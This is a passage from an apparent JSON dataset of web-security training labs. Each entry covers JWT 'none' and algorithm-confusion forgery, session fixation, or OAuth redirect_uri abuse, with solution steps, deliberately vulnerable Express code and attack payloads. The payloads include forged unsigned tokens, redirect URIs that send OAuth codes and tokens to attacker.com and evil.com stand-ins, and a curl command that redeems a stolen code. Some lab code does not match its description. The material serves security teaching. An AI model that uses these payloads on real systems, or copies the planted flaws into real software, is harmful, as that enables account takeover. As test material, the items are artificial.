    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'supersecure') { const token = jwt.sign({ sub: 'carlos' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(403).json({ error: 'Unauthorized' }); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] }); if (payload.sub === 'carlos') return res.send('Welcome to Carlos's account!'); } catch (e) { return res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Bypass Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "{ \"alg\": \"none\" }.{ \"sub\": \"carlos\" }",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "The application issues session cookies using a sequential session ID pattern during unauthenticated visits. Upon login, the session ID is not regenerated. An attacker can set a victim\u00e2\u20ac\u2122s session ID ahead of login and hijack the authenticated session. To solve: Fix Carlos\u00e2\u20ac\u2122s session ID before he logs in, then hijack his session after he authenticates.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to browse the site anonymously and inspect the Set-Cookie header to observe sequential session ID patterns (e.g., session=abc100, abc101, etc.).",
      "Manually guess or brute-force a valid session ID and use an open redirect to get Carlos to visit the crafted URL with your session ID (simulate redirect injection).",
      "Wait for Carlos to log in, reusing the session ID you fixed via open redirect.",
      "Use Burp Repeater to access /my-account with the fixed session ID in the Cookie header.",
      "Confirm access to Carlos\u00e2\u20ac\u2122s account, proving the session was successfully hijacked."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessionCounter = 100; const sessions = {}; app.get('/', (req, res) => { const sid = 'abc' + sessionCounter++; res.cookie('session', sid); sessions[sid] = { authenticated: false, user: null }; res.send('Session initialized'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (username === 'carlos' && password === 'hunter2') { sessions[sid] = { authenticated: true, user: 'carlos' }; res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid]?.authenticated && sessions[sid].user === 'carlos') { res.send('Carlos's account'); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: session=abc104",
      "http://victim.site/redirect?url=http://lab.site/?session=abc104",
      "Burp Intruder attack against incrementing session IDs: abc100 to abc110"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leading to open redirect trust abuse",
    "Lab Description": "The application uses a third-party OAuth provider to handle login via redirects. The redirect_uri is not validated securely, allowing attackers to inject arbitrary URLs and harvest authorization codes. To solve: Trick the OAuth flow to leak Carlos\u00e2\u20ac\u2122s token and use it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Burp Suite to initiate the login flow and observe the OAuth authorization request structure, including client_id and redirect_uri parameters.",
      "Modify the redirect_uri to point to your own server or a URL under your control that simulates a trusted subdomain (e.g., attacker.lab.com).",
      "Send the malicious link to the victim (Carlos) via social engineering. When Carlos clicks it and authorizes access, the authorization code will be redirected to your server.",
      "Exchange the stolen authorization code for an access token using the OAuth token endpoint.",
      "Replay the token using Postman to call /my-account with Authorization: Bearer <token> and access Carlos\u00e2\u20ac\u2122s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const oauthProvider = 'https://auth.example.com'; const clientID = 'app-client-123'; const clientSecret = 'secret'; const redirectURIs = ['https://app.com/callback']; app.get('/login', (req, res) => { const redirect = req.query.redirect_uri; if (!redirect.startsWith('https://app.com')) return res.status(400).send('Invalid redirect'); const url = `${oauthProvider}/authorize?client_id=${clientID}&redirect_uri=${redirect}&response_type=code`; res.redirect(url); }); app.get('/callback', async (req, res) => { const { code } = req.query; const tokenResp = await axios.post(`${oauthProvider}/token`, { code, client_id: clientID, client_secret: clientSecret }); const accessToken = tokenResp.data.access_token; if (accessToken === 'token-carlos') res.send('Carlos's account'); else res.send('Access denied'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "https://auth.example.com/authorize?client_id=app-client-123&redirect_uri=https://attacker.com/callback&response_type=code",
      "Stolen code exchanged via curl: curl -X POST -d 'code=leakedcode&client_id=app-client-123&client_secret=secret' https://auth.example.com/token",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT tampering via algorithm confusion",
    "Lab Description": "This lab's login system uses JWTs for session management and accepts unsigned tokens due to a flawed algorithm check. The application fails to validate the algorithm used in the JWT header. To solve: Forge a JWT token that grants access to Carlos's account using algorithm confusion.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite or Postman to capture a valid JWT issued after login.",
      "Inspect the JWT in jwt.io or a local script to analyze its header and payload.",
      "Change the algorithm in the JWT header from HS256 to 'none' and remove the signature section.",
      "Replace the payload username with 'carlos' to impersonate the victim.",
      "Send the forged token in the Authorization header to access /my-account and confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'supersecure') { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, secret); res.send(`Welcome ${payload.username}`); } catch (e) { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('JWT lab running on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure session handling",
    "Lab Description": "This lab's session management system is vulnerable to session fixation. It reuses session IDs across login flows and does not regenerate tokens upon authentication. The application accepts pre-assigned session cookies before login. To solve: Fixate a session and force Carlos to use it, then access /my-account with the same session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to capture the initial session cookie assigned before login.",
      "Send Carlos a phishing link that pre-sets the session ID via a crafted request.",
      "Use the same session ID on your side and wait for Carlos to log in.",
      "Replay the session using the fixed cookie after Carlos logs in.",
      "Access /my-account to confirm the session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixationkey', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const user = users.find(u => u.username === req.body.username && u.password === req.body.password); if (user) { req.session.user = user.username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send(`Welcome ${req.session.user}`); } else { res.send('Please log in'); } }); app.listen(4001, () => console.log('Session Fixation Lab running on http://localhost:4001'));",
    "payloads": [
      "Set-Cookie: connect.sid=sessid123;",
      "GET /login?session=connect.sid=sessid123",
      "Cookie: connect.sid=sessid123"
    ]
  },
  {
    "Lab scenario": "OAuth redirect manipulation leading to account takeover",
    "Lab Description": "This lab's OAuth flow contains an open redirect flaw on the redirect_uri parameter. The application trusts user-supplied redirect URIs without proper validation, enabling account takeover via third-party OAuth provider token reuse. To solve: Manipulate the redirect URI to capture Carlos\u00e2\u20ac\u2122s OAuth token and use it to access /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth login request and analyze the redirect_uri parameter.",
      "Modify the redirect_uri to a malicious endpoint you control and host it via an HTTP server.",
      "Send the crafted login link to Carlos and wait for the redirect with the authorization code/token.",
      "Exchange the captured code for an access token via a crafted POST request to the OAuth provider.",
      "Replay the token with the session API to log in as Carlos and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/login', (req, res) => { const redirect = req.query.redirect_uri; const oauthUrl = `https://oauth.example.com/auth?client_id=abc123&redirect_uri=${redirect}&response_type=code`; res.redirect(oauthUrl); }); app.get('/callback', async (req, res) => { const code = req.query.code; const tokenResponse = await axios.post('https://oauth.example.com/token', { code, client_id: 'abc123', client_secret: 'xyz789' }); const user = await axios.get('https://oauth.example.com/userinfo', { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` } }); res.send(`Welcome ${user.data.username}`); }); app.listen(4002, () => console.log('OAuth Redirect Lab running on http://localhost:4002'));",
    "payloads": [
      "https://vulnerable.app/login?redirect_uri=https://evil.com/callback",
      "https://evil.com/callback?code=oauthleak123",
      "POST https://oauth.example.com/token with code=oauthleak123"
    ]
  },
  {
    "Lab scenario": "Session fixation leads to MFA bypass",
    "Lab Description": "The application incorrectly allows session identifiers to persist across authentication states, including 2FA. Once a valid user completes login, the session ID issued before 2FA is reused without validation. The application trusts the existing session cookie to grant full access after 2FA step, without re-verifying ownership. To solve: Use session fixation to access Carlos's account without completing MFA.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept GET /login and extract the session cookie issued before login.",
      "2. Log in to your own account and complete the 2FA flow while observing that session ID remains the same.",
      "3. Log out and prepare a script using Postman or Repeater to login as Carlos with known credentials (skipping 2FA).",
      "4. Fix the session ID to the one obtained before login and inject it before login process completes.",
      "5. Use the fixed session to directly access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'vuln-secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'carlospass', is2FAEnabled: true }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; if (user.is2FAEnabled) return res.redirect('/verify'); res.send('Welcome'); } else res.status(403).send('Invalid'); }); app.get('/verify', (req, res) => { res.send('2FA code sent'); }); app.post('/verify', (req, res) => { req.session.authenticated = true; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send(`Account page for ${req.session.username}`); else res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "Reuse pre-auth session cookie after logging in as Carlos",
      "Fix session cookie from anonymous request and bypass MFA step"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via 'none' algorithm",
    "Lab Description": "The application uses JWT tokens for session management but fails to validate the cryptographic algorithm used. If the 'alg' field in the JWT header is set to 'none', the application accepts unsigned tokens. To solve: Forge a JWT token with 'none' algorithm to impersonate Carlos and access the protected account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to capture the Authorization Bearer token after logging in with your own account.",
      "2. Decode the JWT token using jwt.io or CyberChef to view the header and payload.",
      "3. Modify the header to use 'alg':'none' and change the payload sub to 'carlos'.",
      "4. Remove the signature and rebuild the JWT using base64url encoding.",
      "5. Replace the Authorization header with the forged token and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = ['carlos']; app.use((req, res, next) => { const auth = req.headers['authorization']; if (auth) { const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); req.user = payload.payload.sub; } next(); }); app.get('/my-account', (req, res) => { if (users.includes(req.user)) res.send(`Account details for ${req.user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "Authorization: Bearer <JWT with alg=none and sub=carlos>"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect",
    "Lab Description": "This lab demonstrates an OAuth misconfiguration where the 'redirect_uri' parameter is not properly validated during the authorization flow. The application allows arbitrary redirect URIs, enabling token theft via open redirection. To solve: Intercept Carlos's OAuth authorization and redirect the token to your own server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. With OWASP ZAP, proxy the OAuth login request and note the redirect_uri parameter.",
      "2. Confirm that arbitrary redirect URIs are accepted and reflected in the response.",
      "3. Host a malicious server (e.g., using Python SimpleHTTPServer or ngrok) to receive stolen tokens.",
      "4. Craft a malicious OAuth URL with redirect_uri pointing to your malicious server.",
      "5. Send the OAuth URL to Carlos (simulate click), intercept token at your server, and use it to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, token } = req.query; res.redirect(`${redirect_uri}?token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.query.token; if (token === 'carlos-access-token') res.send('Welcome Carlos'); else res.status(401).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable-app.com/auth?redirect_uri=https://attacker.com&token=carlos-access-token",
      "https://attacker.com/?token=carlos-access-token"
    ]
  },
  {
    "Lab scenario": "JWT token none algorithm bypass in API auth flow",
    "Lab Description": "This lab's REST API uses JWT tokens for authentication. The server does not validate the JWT signature when the algorithm is set to 'none'. The application processes JWTs without verifying the integrity of the claims. To solve: forge a JWT for the user 'carlos' and access the protected API endpoint /api/account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT issued after login using Burp Suite or Postman.",
      "Decode the JWT using jwt.io and observe the 'alg' field is set to 'HS256'.",
      "Replace the 'alg' value with 'none' and set 'sub' or 'user' claim to 'carlos'.",
      "Remove the signature part of the token (third segment after the second dot).",
      "Use the modified JWT in the Authorization: Bearer header to request /api/account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); const token = jwt.sign({ user: username }, 'supersecret'); res.json({ token }); }); app.get('/api/account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = decoded.payload.user; if (user === 'carlos') return res.send('Sensitive account info'); } else { jwt.verify(token, 'supersecret'); return res.send('Standard account info'); } } catch (e) { return res.status(400).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable token reuse",
    "Lab Description": "The application uses session tokens in URL parameters and fails to regenerate the session upon authentication. An attacker can fix a session identifier and trick the victim into logging in with it, gaining access to their authenticated session. To solve: hijack Carlos\u00e2\u20ac\u2122s session by pre-setting a known session token before login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access the site and note the session token included in URLs, e.g., ?sid=abc123.",
      "Send the victim a crafted login URL containing a known session token: /login?sid=attacker123.",
      "Use Postman or OWASP ZAP to log in using this session token.",
      "After victim logs in via the malicious link, wait and reuse the same session token.",
      "Access /account?sid=attacker123 to take over the victim session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'carlos', password: 'letmein' }]; let sessions = {}; app.get('/login', (req, res) => { const sid = req.query.sid || Math.random().toString(36).substring(2); sessions[sid] = { loggedIn: false }; res.send(`<form method='POST' action='/login?sid=${sid}'><input name='username'><input name='password'><button>Login</button></form>`); }); app.post('/login', (req, res) => { const sid = req.query.sid; let body = ''; req.on('data', chunk => body += chunk); req.on('end', () => { const params = new URLSearchParams(body); const user = users.find(u => u.username === params.get('username') && u.password === params.get('password')); if (user) sessions[sid].loggedIn = true; res.redirect(`/account?sid=${sid}`); }); }); app.get('/account', (req, res) => { const sid = req.query.sid; if (sessions[sid] && sessions[sid].loggedIn) res.send('Sensitive data for logged in user'); else res.send('Not authenticated'); }); app.listen(4000);",
    "payloads": [
      "/login?sid=attacker123",
      "/account?sid=attacker123",
      "POST /login?sid=attacker123"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect and no state parameter",
    "Lab Description": "This lab demonstrates an OAuth implementation that fails to validate the 'state' parameter, exposing it to CSRF and token theft via open redirection. The application blindly trusts the redirect URI and leaks access tokens. To solve: craft a malicious authorization request that sends Carlos\u00e2\u20ac\u2122s token to your controlled server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate a login flow and capture the authorization URL.",
      "Observe that the 'state' parameter is either absent or not enforced by the app.",
      "Modify the redirect_uri to a malicious URL you control (e.g., https://evil.com/capture).",
      "Send this crafted URL to Carlos via phishing or simulate the redirect.",
      "Capture the access token in your server and replay it against /account API."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const axios = require('axios'); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'token-for-carlos'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer token-for-carlos') res.send('Carlos account info'); else res.status(403).send('Invalid token'); }); app.listen(5000);",
    "payloads": [
      "https://vulnerable-app.com/auth?redirect_uri=https://evil.com/capture",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in token verification endpoint",
    "Lab Description": "This lab implements a stateless authentication mechanism using JSON Web Tokens (JWTs). However, the server is vulnerable to an algorithm confusion flaw due to improper handling of the JWT 'alg' field. The application accepts tokens signed using both 'HS256' and 'RS256', using a single public key to verify all incoming tokens. To solve the lab, forge a valid admin token and access the administrative panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to capture a valid JWT after logging in as a regular user.",
      "2. Use jwt.io or a script to decode the token and analyze the payload and header.",
      "3. Modify the 'alg' field in the JWT header to 'HS256' and replace the 'sub' claim with 'admin'.",
      "4. Use the server\u00e2\u20ac\u2122s public key (obtained from /public.pem) as the HMAC secret to sign the modified JWT using HS256.",
      "5. Submit the forged JWT as a cookie and access /admin to verify successful privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const pubKey = fs.readFileSync('./public.pem'); app.get('/login', (req, res) => { const user = req.query.user || 'guest'; const token = jwt.sign({ sub: user, role: 'user' }, pubKey, { algorithm: 'RS256' }); res.cookie('auth', token); res.send(`Token issued for ${user}`); }); app.get('/admin', (req, res) => { try { const token = req.cookies.auth; const decoded = jwt.verify(token, pubKey); if (decoded.sub === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Access denied'); } } catch (err) { res.status(401).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Header: {\"alg\":\"HS256\"}, Payload: {\"sub\":\"admin\"}, Signed with public.pem as secret",
      "jwt.sign({sub:'admin'}, pubKey, {algorithm: 'HS256'})"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure cookie reassignment",
    "Lab Description": "This lab's session management is flawed. The application does not regenerate the session ID upon successful login, allowing an attacker to fix the victim's session ID prior to authentication. The application accepts a session ID as a query parameter and reflects it into a cookie. To solve the lab, fix a session ID for Carlos and trick him into logging in, then use the same session ID to access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to craft a GET request to /set-session?sid=attacker123 and observe that the Set-Cookie header reflects the session ID.",
      "2. Share a crafted link like /login?sid=attacker123 with Carlos via the simulated email client.",
      "3. Wait for Carlos to log in using the attacker-controlled session ID.",
      "4. Use the same session ID cookie 'sid=attacker123' in a request to /my-account.",
      "5. Confirm you are logged in as Carlos and view his account details."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'abc123' }]; app.get('/set-session', (req, res) => { const { sid } = req.query; res.cookie('sid', sid); res.send('Session set'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Invalid credentials'); const sid = req.cookies.sid || `sess_${Math.random().toString(36).substring(2)}`; sessions[sid] = username; res.cookie('sid', sid); res.send('Login successful'); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sid]; if (username) res.send(`Welcome ${username}`); else res.status(403).send('Access denied'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "/set-session?sid=attacker123",
      "/login?sid=attacker123",
      "Cookie: sid=attacker123"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via referrer header",
    "Lab Description": "This lab demonstrates how improper use of the OAuth 2.0 implicit flow results in access token leakage via the HTTP Referer header. The vulnerable application redirects users with an access token in the URL fragment. An attacker-controlled site can trick authenticated users into visiting a resource which leaks the token in the Referer header. To solve the lab, steal Carlos's access token and access the /private-data endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Set up a listener (e.g., https://attacker.com/log) and host a malicious page that loads an image from /profile#access_token=XYZ.",
      "2. Send Carlos a crafted link to https://attacker.com?redirect=https://vulnerable.com/profile#access_token=XYZ.",
      "3. Carlos's browser loads the image from the vulnerable app with the token in the fragment.",
      "4. The fragment is not sent to the server, but if redirected to another page with the token appended to the query string, it leaks via the Referer header.",
      "5. Capture the access token in your server logs and reuse it by sending a request with Authorization: Bearer <token> to /private-data.",
      "6. Confirm access to private data and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/authorize', (req, res) => { const redirect = req.query.redirect_uri; const token = 'carlos-token'; res.redirect(`${redirect}#access_token=${token}`); }); app.get('/private-data', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const user = tokens[token]; if (!user) return res.status(403).send('Invalid token'); res.send(`Private data of ${user}`); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Token Leakage Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable.com/profile#access_token=carlos-token",
      "Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm bypass in REST API login flow",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) to manage sessions and validate authenticated users via a RESTful login API. However, it incorrectly accepts the 'none' algorithm in JWTs, allowing token forgery. The application trusts the JWT payload without signature verification when 'alg' is set to 'none'. To solve: Forge a JWT for the user carlos and access their account page using the tampered token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to send valid credentials to the /api/login endpoint and retrieve a signed JWT.",
      "2. Decode the JWT using jwt.io or a JWT decoder in Burp Suite to inspect the header and payload structure.",
      "3. Modify the JWT header by changing the 'alg' field to 'none', and alter the payload to set 'username' to 'carlos'.",
      "4. Remove the signature portion entirely and send the tampered token in the Authorization header: 'Bearer <token>'.",
      "5. Verify access to /api/account and check that the response contains Carlos\u00e2\u20ac\u2122s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'supersecret' }]; app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/api/account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') { res.send('Sensitive account data for carlos'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }.",
      "JWT crafted with alg: none, no signature, username: carlos"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation",
    "Lab Description": "This application uses OAuth2 for third-party login, but fails to properly validate redirect URIs. It accepts user-controlled input in the redirect_uri parameter during the authorization flow. To solve: Trick the OAuth provider to send an access token to your controlled domain, then use the token to gain access to Carlos\u00e2\u20ac\u2122s account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP or Burp Suite to intercept the OAuth authorization flow during login with Google.",
      "2. Modify the redirect_uri parameter in the authorization request to a domain you control (e.g., https://evil.com/callback).",
      "3. Simulate the OAuth flow and capture the token returned to your malicious redirect URI.",
      "4. Replay the login request with the captured token, modifying the Authorization header to include: Bearer <token>.",
      "5. Use the token to access /my-account endpoint as carlos and verify lab completion."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const url = `https://oauth.fake-provider.com/auth?client_id=app123&redirect_uri=${redirect_uri}&response_type=token`; res.redirect(url); }); app.get('/oauth-callback', (req, res) => { const token = req.query.access_token; request.get({ url: 'https://oauth.fake-provider.com/userinfo', headers: { Authorization: `Bearer ${token}` } }, (err, resp, body) => { const userInfo = JSON.parse(body); if (userInfo.email === 'carlos@example.com') { res.send('Account page for carlos'); } else { res.send('Unauthorized'); } }); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Redirect URI Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://oauth.fake-provider.com/auth?client_id=app123&redirect_uri=https://evil.com/callback",
      "Manipulated redirect_uri=https://evil.com/callback",
      "Stolen token from OAuth callback"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login response",
    "Lab Description": "The application assigns session IDs before login and fails to regenerate them upon successful authentication. An attacker can predetermine a session and then trick a user into authenticating with it. To solve: Set a fixed session ID for Carlos before he logs in, then hijack the session to access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to capture a login request and observe that the session cookie is issued before login.",
      "2. Generate a fixed session ID and set it using document.cookie via XSS or social engineering in the victim\u00e2\u20ac\u2122s browser.",
      "3. Wait for the victim (Carlos) to log in with the fixed session.",
      "4. Reuse the known session ID in your own browser via the Cookie header.",
      "5. Access the /account endpoint to retrieve Carlos\u00e2\u20ac\u2122s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: '123456' }]; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\" /><input name=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid; sessions[sid] = username; res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const username = sessions[req.cookies.sid]; if (username === 'carlos') res.send('Account data for carlos'); else res.send('Access denied'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: sid=abc123 (set in victim's browser)",
      "Session hijack via fixed sid=abc123",
      "Use of known SID to access /account as carlos"
    ]
  },
  {
    "Lab scenario": "JWT Secret Key Brute-Force in Authorization Header",
    "Lab Description": "This lab uses JWT tokens for stateless authentication but fails to use a secure secret key. The token is signed with a guessable value, making it vulnerable to brute-force attacks. The application verifies the signature using a hardcoded secret and grants access based on the 'admin' claim. To solve: Forge a valid JWT token with 'admin':true and access the /admin endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the JWT token from the Authorization header after logging in as a regular user.",
      "Use jwt.io or jwt_tool to decode the token and analyze the header and payload.",
      "Brute-force the JWT secret using a common wordlist with jwt-cracker or hashcat (mode 16500).",
      "Once the correct secret is found, modify the payload to include 'admin':true and re-sign the token.",
      "Replace the original Authorization header with the forged token and send a GET request to /admin to verify access."
    ],
    "Vulnerability name": "Authentication",
